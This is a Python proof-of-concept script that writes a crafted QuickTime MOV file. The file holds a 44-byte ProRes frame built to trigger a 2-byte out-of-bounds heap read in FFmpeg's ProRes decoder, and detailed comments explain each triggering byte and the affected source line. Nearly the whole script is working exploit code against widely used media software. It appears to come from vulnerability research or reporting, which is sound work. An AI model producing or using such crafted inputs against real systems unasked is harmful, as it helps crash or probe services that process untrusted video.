#!/usr/bin/env python3
"""
PoC for VULN 001: decode_slice_thread 2-byte OOB Heap Read
File: FFmpeg/libavcodec/proresdec.c, line 665
CWE: CWE-125 (Out-of-bounds Read)

Trigger conditions:
  - slice data_size == 6  (index table entry = 0x0006)
  - slice buf[0] >= 0x40  (hdr_size = buf[0]>>3 >= 8 > 7)

Effect: line 665 executes: v_data_size = AV_RB16(buf + 6)
  This reads buf[6] and buf[7], which are 2 bytes past the 6-byte slice
  boundary, constituting a 2-byte out-of-bounds heap read.

ProRes frame layout we craft (44 bytes total):
  [0-3]   frame_size = 44 (BE uint32)
  [4-7]   "icpf"
  [8-27]  frame header (20 bytes):
            [8-9]   frame_hdr_size = 20
            [10-11] version = 0
            [12-15] reserved
            [16-17] width = 16
            [18-19] height = 16
            [20]    chroma/frame_type = 0x00 (4:2:2, progressive)
            [21]    reserved
            [22]    colorprimaries = 1
            [23]    transfer_char = 1
            [24]    matrix_coeffs = 1
            [25]    alpha_info = 0
            [26]    reserved
            [27]    flags = 0 (no custom quant matrices)
  [28-35] picture header (8 bytes):
            [28]    0x40  -> pic hdr_size = 0x40>>3 = 8
            [29-32] pic_data_size = 16
            [33-34] slice_count hint = 1
            [35]    log2_slice_mb = 0x00
  [36-37] slice index table: slice[0] size = 6 (BE uint16)
  [38-43] slice data (6 bytes):
            [38]    0x40  -> slice hdr_size = 0x40>>3 = 8 > 7 -> TRIGGER
            [39]    0x01  (qscale)
            [40-41] 0x00 0x00 (y_data_size = 0)
            [42-43] 0x00 0x00 (u_data_size = 0)
            [44-45] *** OOB READ: AV_RB16(buf+6) reads here ***
"""

import struct
import os
import sys


def pack_box(fourcc, data):
    """Create a QuickTime/ISO box with the given fourcc and data."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc + data


def build_prores_frame():
    """
    Build a minimal ProRes bitstream that triggers the OOB read.

    Returns 44 bytes that will be placed in the mdat of the .mov file.
    When decoded by proresdec.c:
      - decode_frame_header() succeeds (frame header = bytes 8-27)
      - decode_picture_header() succeeds (pic header = bytes 28-37)
      - decode_slice_thread() performs OOB read at line 665
    """
    frame = bytearray()

    # ---- Outer frame wrapper (8 bytes) ----
    frame += struct.pack('>I', 44)   # frame_size (total, including this field)
    frame += b'icpf'                 # ProRes magic (checked via AV_RL32 in decode_frame)

    # ---- Frame header (20 bytes, starting at packet offset 8) ----
    # decode_frame_header() reads this region.
    # buf[0-1]: hdr_size  => we set to 20
    # buf[2-3]: version   => 0 (must be <= 1)
    # buf[4-7]: (logged but not validated)
    # buf[8-9]: width     => 16
    # buf[10-11]: height  => 16
    # buf[12]: chroma + frame_type => 0x00 = YUV 4:2:2, progressive
    # buf[14]: colorprimaries
    # buf[15]: transfer_char
    # buf[16]: matrix_coeffs
    # buf[17]: alpha_info & 0xf => 0 (no alpha)
    # buf[19]: flags => 0 (no custom quantization matrices; use defaults)
    frame += struct.pack('>H', 20)   # frame_hdr_size
    frame += struct.pack('>H', 0)    # version = 0
    frame += b'\x00\x00\x00\x00'    # buf[4-7] padding
    frame += struct.pack('>H', 16)   # width = 16 pixels
    frame += struct.pack('>H', 16)   # height = 16 pixels
    frame += b'\x00'                 # buf[12]: frame_type=0, chroma=0 (4:2:2)
    frame += b'\x00'                 # buf[13]: reserved
    frame += b'\x01'                 # buf[14]: colorprimaries
    frame += b'\x01'                 # buf[15]: transfer_char
    frame += b'\x01'                 # buf[16]: matrix_coeffs
    frame += b'\x00'                 # buf[17]: alpha_info = 0
    frame += b'\x00'                 # buf[18]: reserved
    frame += b'\x00'                 # buf[19]: flags = 0 (no quant tables)
    # Frame header end: offset 28

    # ---- Picture header (8 bytes, at packet offset 28) ----
    # decode_picture_header() reads this.
    # buf[0]: hdr_size = buf[0]>>3 => 0x40>>3 = 8, range check: 8 >= 8, OK
    # buf[1-4]: pic_data_size = 16
    # buf[5-6]: slice_count hint (QT ignores this; actual count computed from dims)
    # buf[7]: log2_slice_mb_width (high nibble) | log2_slice_mb_height (low nibble)
    #         => 0x00 -> 1 MB per slice, single slice row
    #
    # With width=16, height=16: mb_width=1, mb_height=1, slice_count=1
    frame += b'\x40'                 # buf[0]: pic hdr_size = 8 (0x40 >> 3)
    frame += struct.pack('>I', 16)   # buf[1-4]: pic_data_size = 16
    frame += struct.pack('>H', 1)    # buf[5-6]: slice_count hint
    frame += b'\x00'                 # buf[7]: log2_slice_mb = 0
    # Picture header end: offset 36

    # ---- Slice index table (2 bytes, at packet offset 36) ----
    # 1 entry: slice[0] has data_size = 6 bytes.
    # decode_picture_header() reads this and sets slice->data_size = 6.
    # The check "if (slice->data_size < 6)" passes (6 == 6, not < 6).
    frame += struct.pack('>H', 6)    # slice[0] size = 6

    # ---- Slice data (6 bytes, at packet offset 38) ----
    # decode_slice_thread() gets buf = &slice->data = packet+38
    # Line 659: hdr_size = buf[0] >> 3 = 0x40 >> 3 = 8
    # Line 660: qscale = clip(buf[1]=0x01, 1, 224) = 1
    # Line 662: y_data_size = AV_RB16(buf+2) = 0
    # Line 663: u_data_size = AV_RB16(buf+4) = 0
    # Line 664: v_data_size = 6 - 0 - 0 - 8 = -2
    # Line 665: if (hdr_size=8 > 7): v_data_size = AV_RB16(buf+6)
    #   *** OOB READ: buf+6 = packet+44, 2 bytes past the 6-byte slice ***
    frame += b'\x40'                 # buf[0]: hdr_size = 8 > 7 -> triggers OOB path
    frame += b'\x01'                 # buf[1]: qscale = 1
    frame += b'\x00\x00'             # buf[2-3]: y_data_size = 0
    frame += b'\x00\x00'             # buf[4-5]: u_data_size = 0
    # buf[6-7] are NOT present in this slice -> OOB read at buf+6 on line 665

    assert len(frame) == 44, f"Frame size mismatch: {len(frame)} != 44"
    return bytes(frame)


def build_video_sample_desc(fourcc, width, height):
    """Build a VideoSampleDescription box for a QuickTime video track."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')

    body = b''
    body += b'\x00' * 6              # reserved (6 bytes)
    body += struct.pack('>H', 1)     # data_reference_index = 1
    body += b'\x00' * 16             # pre-defined / reserved
    body += struct.pack('>H', width)  # width
    body += struct.pack('>H', height) # height
    body += struct.pack('>I', 0x00480000)  # horizontal resolution = 72 dpi (16.16 fixed)
    body += struct.pack('>I', 0x00480000)  # vertical resolution = 72 dpi
    body += struct.pack('>I', 0)     # data size (reserved, must be 0)
    body += struct.pack('>H', 1)     # frame count per sample
    body += b'\x00' * 32             # compressor name (empty pascal string + padding)
    body += struct.pack('>H', 0x18)  # pixel depth = 24
    body += struct.pack('>H', 0xFFFF) # color table id = -1 (default)

    return pack_box(fourcc, body)


def build_mov(prores_data, width=16, height=16):
    """
    Build a minimal QuickTime MOV file wrapping the given ProRes frame.

    Structure:
      ftyp (20 bytes)
      mdat (8 + len(prores_data) bytes) -- media data
      moov (movie metadata)
        mvhd
        trak
          tkhd
          mdia
            mdhd
            hdlr
            minf
              vmhd
              dinf -> dref
              stbl
                stsd -> 'apcn' VideoSampleDesc
                stts (1 sample of duration 600)
                stsc (1 chunk of 1 sample)
                stsz (1 sample of len(prores_data) bytes)
                stco (chunk offset = start of prores_data in file)
    """

    # ---- ftyp ----
    ftyp_body  = b'qt  '                       # major brand
    ftyp_body += struct.pack('>I', 0x200)       # minor version
    ftyp_body += b'qt  '                        # compatible brand
    ftyp = pack_box('ftyp', ftyp_body)

    # ---- mdat ----
    mdat = pack_box('mdat', prores_data)

    # The ProRes data starts at: len(ftyp) + 8 (mdat box header)
    prores_offset = len(ftyp) + 8

    # ---- mvhd ----
    mvhd_body  = struct.pack('>I', 0)           # version/flags
    mvhd_body += struct.pack('>I', 0)           # creation time
    mvhd_body += struct.pack('>I', 0)           # modification time
    mvhd_body += struct.pack('>I', 600)         # time scale (600 ticks/s)
    mvhd_body += struct.pack('>I', 600)         # duration (1 second)
    mvhd_body += struct.pack('>I', 0x00010000)  # preferred rate = 1.0
    mvhd_body += struct.pack('>H', 0x0100)      # preferred volume = 1.0
    mvhd_body += b'\x00' * 10                   # reserved
    # 3x3 transformation matrix (identity)
    mvhd_body += struct.pack('>9I',
                             0x00010000, 0, 0,
                             0, 0x00010000, 0,
                             0, 0, 0x40000000)
    mvhd_body += b'\x00' * 24                   # pre-defined fields
    mvhd_body += struct.pack('>I', 2)           # next track ID
    mvhd = pack_box('mvhd', mvhd_body)

    # ---- tkhd ----
    tkhd_body  = struct.pack('>I', 3)           # version/flags: track enabled(1) + in-movie(2)
    tkhd_body += struct.pack('>I', 0)           # creation time
    tkhd_body += struct.pack('>I', 0)           # modification time
    tkhd_body += struct.pack('>I', 1)           # track ID = 1
    tkhd_body += struct.pack('>I', 0)           # reserved
    tkhd_body += struct.pack('>I', 600)         # duration
    tkhd_body += b'\x00' * 8                    # reserved
    tkhd_body += struct.pack('>H', 0)           # layer
    tkhd_body += struct.pack('>H', 0)           # alternate group
    tkhd_body += struct.pack('>H', 0)           # volume (0 for video tracks)
    tkhd_body += struct.pack('>H', 0)           # reserved
    tkhd_body += struct.pack('>9I',             # identity matrix
                             0x00010000, 0, 0,
                             0, 0x00010000, 0,
                             0, 0, 0x40000000)
    tkhd_body += struct.pack('>I', width << 16)  # track width  (16.16 fixed)
    tkhd_body += struct.pack('>I', height << 16) # track height (16.16 fixed)
    tkhd = pack_box('tkhd', tkhd_body)

    # ---- mdhd ----
    mdhd_body  = struct.pack('>I', 0)           # version/flags
    mdhd_body += struct.pack('>I', 0)           # creation time
    mdhd_body += struct.pack('>I', 0)           # modification time
    mdhd_body += struct.pack('>I', 600)         # time scale
    mdhd_body += struct.pack('>I', 600)         # duration
    mdhd_body += struct.pack('>H', 0)           # language
    mdhd_body += struct.pack('>H', 0)           # quality
    mdhd = pack_box('mdhd', mdhd_body)

    # ---- hdlr ----
    hdlr_body  = struct.pack('>I', 0)           # version/flags
    hdlr_body += b'mhlr'                        # component type (media handler)
    hdlr_body += b'vide'                        # handler type (video)
    hdlr_body += struct.pack('>I', 0)           # component manufacturer
    hdlr_body += struct.pack('>I', 0)           # component flags
    hdlr_body += struct.pack('>I', 0)           # component flags mask
    hdlr_body += b'Video Media Handler\x00'     # component name (C string)
    hdlr = pack_box('hdlr', hdlr_body)

    # ---- dref / dinf ----
    dref_entry  = struct.pack('>I', 12)         # entry size = 12 bytes
    dref_entry += b'url '                       # type: URL data reference
    dref_entry += struct.pack('>I', 1)          # flags = 1 (self-contained)
    dref_body  = struct.pack('>I', 0)           # version/flags
    dref_body += struct.pack('>I', 1)           # entry count
    dref_body += dref_entry
    dref  = pack_box('dref', dref_body)
    dinf  = pack_box('dinf', dref)

    # ---- vmhd ----
    vmhd_body  = struct.pack('>I', 1)           # version/flags = 1
    vmhd_body += struct.pack('>H', 0)           # graphics mode
    vmhd_body += struct.pack('>HHH', 0, 0, 0)  # opcolor
    vmhd = pack_box('vmhd', vmhd_body)

    # ---- stsd ----
    stsd_body  = struct.pack('>I', 0)           # version/flags
    stsd_body += struct.pack('>I', 1)           # entry count
    stsd_body += build_video_sample_desc('apcn', width, height)
    stsd = pack_box('stsd', stsd_body)

    # ---- stts ----
    stts_body  = struct.pack('>I', 0)           # version/flags
    stts_body += struct.pack('>I', 1)           # entry count
    stts_body += struct.pack('>I', 1)           # sample count = 1
    stts_body += struct.pack('>I', 600)         # sample duration = 600 ticks
    stts = pack_box('stts', stts_body)

    # ---- stsc ----
    stsc_body  = struct.pack('>I', 0)           # version/flags
    stsc_body += struct.pack('>I', 1)           # entry count
    stsc_body += struct.pack('>I', 1)           # first chunk = 1
    stsc_body += struct.pack('>I', 1)           # samples per chunk = 1
    stsc_body += struct.pack('>I', 1)           # sample description index = 1
    stsc = pack_box('stsc', stsc_body)

    # ---- stsz ----
    stsz_body  = struct.pack('>I', 0)           # version/flags
    stsz_body += struct.pack('>I', 0)           # constant sample size = 0 (variable)
    stsz_body += struct.pack('>I', 1)           # sample count
    stsz_body += struct.pack('>I', len(prores_data))  # sample[0] size
    stsz = pack_box('stsz', stsz_body)

    # ---- stco ----
    stco_body  = struct.pack('>I', 0)           # version/flags
    stco_body += struct.pack('>I', 1)           # entry count
    stco_body += struct.pack('>I', prores_offset)  # chunk[0] file offset
    stco = pack_box('stco', stco_body)

    # ---- stbl -> minf -> mdia -> trak -> moov ----
    stbl = pack_box('stbl', stsd + stts + stsc + stsz + stco)
    minf = pack_box('minf', vmhd + dinf + stbl)
    mdia = pack_box('mdia', mdhd + hdlr + minf)
    trak = pack_box('trak', tkhd + mdia)
    moov = pack_box('moov', mvhd + trak)

    return ftyp + mdat + moov


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_file = os.path.join(script_dir, 'vuln_001_input.mov')

    print("[*] VULN 001: decode_slice_thread OOB Heap Read (proresdec.c:665)")
    print("[*] Trigger: slice data_size=6, buf[0]=0x40 (hdr_size=8 > 7)")

    prores_frame = build_prores_frame()
    print(f"[+] ProRes frame: {len(prores_frame)} bytes")
    print(f"    Frame bytes [38-43] (slice data): {prores_frame[38:44].hex()}")
    print(f"    slice buf[0] = 0x{prores_frame[38]:02x} -> hdr_size = {prores_frame[38] >> 3}")
    print(f"    OOB read: AV_RB16(buf+6) reads packet bytes [44-45] (past slice end)")

    mov_data = build_mov(prores_frame)
    print(f"[+] MOV file:   {len(mov_data)} bytes")
    print(f"    ProRes data starts at file offset 28 (ftyp=20 + mdat_hdr=8)")

    with open(output_file, 'wb') as f:
        f.write(mov_data)
    print(f"[+] Written: {output_file}")

    # Sanity check: verify key bytes in the output
    with open(output_file, 'rb') as f:
        raw = f.read()
    icpf_off = raw.find(b'icpf')
    if icpf_off >= 0:
        slice_data_off = icpf_off + 38  # icpf is at frame+4, slice data at frame+38 -> offset=34 from icpf
        # Actually: icpf at file offset 32 (20 ftyp + 8 mdat_hdr + 4 frame_size)
        # Frame starts at file offset 28, so icpf at 28+4=32
        # Slice data at 28+38=66
        slice_data_off = icpf_off - 4 + 38  # frame start = icpf-4, slice start = frame+38
        print(f"[+] Sanity: 'icpf' found at file offset {icpf_off}")
        print(f"    Slice data at file offset {slice_data_off}: {raw[slice_data_off:slice_data_off+6].hex()}")
    else:
        print("[-] WARNING: 'icpf' not found in output file!")
        sys.exit(1)

    print("[+] File ready. Run ./run.sh to trigger the vulnerability.")


if __name__ == '__main__':
    main()
